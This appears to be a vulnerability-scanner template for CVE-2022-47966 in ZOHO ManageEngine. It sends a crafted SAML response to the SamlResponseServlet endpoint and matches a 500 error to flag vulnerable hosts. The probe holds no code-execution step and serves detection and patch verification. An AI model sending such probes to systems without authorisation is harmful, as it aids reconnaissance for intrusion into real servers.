id: cve-2022-47966
info:
  name: Multiple ZOHO ManageEngine products SamlResponseServlet RCE Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    A number of ZOHO ManageEngine products have security vulnerabilities stemming from the use of Apache xmlsec version 1.4.1. This allows for remote code execution via crafted SAML responses.
  reference:
    - https://github.com/horizon3ai/CVE-2022-47966
  classification:
    cve-id: CVE-2022-47966
    cvss-score: 9.8
variables:
  payload: |
    <?xml version="1.0" encoding="UTF-8"?>
    <samlp:Response ID="_eddc1e5f-8c87-4e55-8309-c6d69d6c2adf" InResponseTo="_4b05e414c4f37e41789b6ef1bdaaa9ff" IssueInstant="2023-01-16T13:56:46.514Z" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
      <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
      </samlp:Status>
      <Assertion ID="_b5a2e9aa-8955-4ac6-94f5-334047882600" IssueInstant="2023-01-16T13:56:46.498Z" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
        <Issuer>a</Issuer>
        <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
          <ds:SignedInfo>
            <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xml-dsig-more#rsa-sha256"/>
          </ds:SignedInfo>
          <ds:SignatureValue>RbBWB6AIP8AN1wT...</ds:SignatureValue>
          <ds:KeyInfo/>
        </ds:Signature>
      </Assertion>
    </samlp:Response>
http:
  - raw:
      - |
        POST /SamlResponseServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        SAMLResponse={{base64(payload)}}&RelayState=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Unknown error occurred while processing your request"
        part: body
